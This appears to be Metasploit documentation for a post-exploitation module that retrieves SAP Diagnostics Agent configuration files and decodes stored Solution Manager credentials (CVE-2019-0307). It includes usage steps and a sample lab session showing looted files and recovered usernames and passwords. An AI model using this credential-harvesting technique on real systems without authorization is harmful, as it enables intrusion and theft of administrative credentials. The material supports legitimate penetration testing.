## Vulnerable Application

This module retrieves the `secstore.properties` file on a SMDAgent.
This file contains the credentials used by the SMDAgent to connect to the SAP Solution Manager server.

## Verification Steps

1. Get a `shell` or `meterpreter` session on some host.
2. Do: `use post/multi/sap/smdagent_get_properties`
3. Do: `set SESSION [SESSION_ID]`, replacing `[SESSION_ID]` with the session number you wish to run this one.
4. Do: `run`
5. If the system has configuration files containing unencrypted credentials for the SAP Solution Manager server, they will be printed out.

## Options

None.

## Scenarios

```
msf6 post(multi/sap/smdagent_get_properties) > sessions

Active sessions
===============

  Id  Name  Type                     Information                             Connection
  --  ----  ----                     -----------                             ----------
  1         shell linux              SSH daaadm:TestPass1 (172.16.30.14:22)  192.168.50.2:58316 -> 172.16.30.14:22 (172.16.30.14)
  2         meterpreter x64/windows  SAP731\Administrator @ SAP731           0.0.0.0:0 -> 172.16.30.80:4444 (172.16.30.80)

msf6 post(multi/sap/smdagent_get_properties) > set SESSION 1
SESSION => 1
msf6 post(multi/sap/smdagent_get_properties) > run

[+] File /usr/sap/DAA/SMDA98/SMDAgent/configuration/runtime.properties saved in: /Users/vladimir/.msf4/loot/20210329205801_SAP_TEST_172.16.30.14_smdagent.propert_457968.txt
[+] File /usr/sap/DAA/SMDA98/SMDAgent/configuration/secstore.properties saved in: /Users/vladimir/.msf4/loot/20210329205811_SAP_TEST_172.16.30.14_smdagent.propert_587689.txt

[*] Instance: SMDA98
[*] Runtime properties file name: /usr/sap/DAA/SMDA98/SMDAgent/configuration/runtime.properties
[*] Secstore properties file name: /usr/sap/DAA/SMDA98/SMDAgent/configuration/secstore.properties

[*] SLD properties:
[*] SLD protocol: http
[*] SLD hostname: solman.corp.test.com
[*] SLD port: 50000
[+] SLD username: j2ee_admin
[+] SLD password: asdQWE123

[*] SMD properties:
[*] SMD url: p4://172.16.30.46:50004
[+] SMD username: j2ee_admin
[+] SMD password: asdQWE123

[+] Store decoded credentials for SolMan server
[*] Post module execution completed
msf6 post(multi/sap/smdagent_get_properties) > set SESSION 2
SESSION => 2
msf6 post(multi/sap/smdagent_get_properties) > run

[+] File c:\usr\sap\DAA\SMDA97\SMDAgent\configuration\runtime.properties saved in: /Users/vladimir/.msf4/loot/20210329205823_SAP_TEST_172.16.30.80_smdagent.propert_357417.txt
[+] File c:\usr\sap\DAA\SMDA97\SMDAgent\configuration\secstore.properties saved in: /Users/vladimir/.msf4/loot/20210329205823_SAP_TEST_172.16.30.80_smdagent.propert_604626.txt

[*] Instance: SMDA97
[*] Runtime properties file name: c:\usr\sap\DAA\SMDA97\SMDAgent\configuration\runtime.properties
[*] Secstore properties file name: c:\usr\sap\DAA\SMDA97\SMDAgent\configuration\secstore.properties

[*] SLD properties:
[*] SLD protocol: http
[*] SLD hostname: 172.16.30.46
[*] SLD port: 50000
[+] SLD username: SLDDSUSER
[+] SLD password: asdQWE123

[*] SMD properties:
[*] SMD url: p4://172.16.30.46:50004
[+] SMD username: j2ee_admin
[+] SMD password: asdQWE123

[+] Store decoded credentials for SolMan server
[*] Post module execution completed
msf6 post(multi/sap/smdagent_get_properties) > creds
Credentials
===========

host           origin         service           public      private    realm  private_type  JtR Format
----           ------         -------           ------      -------    -----  ------------  ----------
172.16.30.100  172.16.30.100  50000/tcp (http)  j2ee_admin  asdQWE123         Password
172.16.30.100  172.16.30.100  50000/tcp (http)  SLDDSUSER   asdQWE123         Password

msf6 post(multi/sap/smdagent_get_properties) > services
Services
========

host           port   proto  name  state  info
----           ----   -----  ----  -----  ----
172.16.30.46   50000  tcp    soap  open   SAP Solution Manager

msf6 post(multi/sap/smdagent_get_properties) > vulns

Vulnerabilities
===============

Timestamp                Host          Name                                                       References
---------                ----          ----                                                       ----------
2021-03-29 17:58:11 UTC  172.16.30.14  Diagnostics Agent in Solution Manager, stores unencrypted  CVE-2019-0307,URL-https://conference.hitb.org/hitblockdown
                                        credentials for Solution Manager server                   002/materials/D2T1%20-%20SAP%20RCE%20-%20The%20Agent%20Who
                                                                                                  %20Spoke%20Too%20Much%20-%20Yvan%20Genuer.pdf
2021-03-29 17:58:23 UTC  172.16.30.80  Diagnostics Agent in Solution Manager, stores unencrypted  CVE-2019-0307,URL-https://conference.hitb.org/hitblockdown
                                        credentials for Solution Manager server                   002/materials/D2T1%20-%20SAP%20RCE%20-%20The%20Agent%20Who
                                                                                                  %20Spoke%20Too%20Much%20-%20Yvan%20Genuer.pdf

```
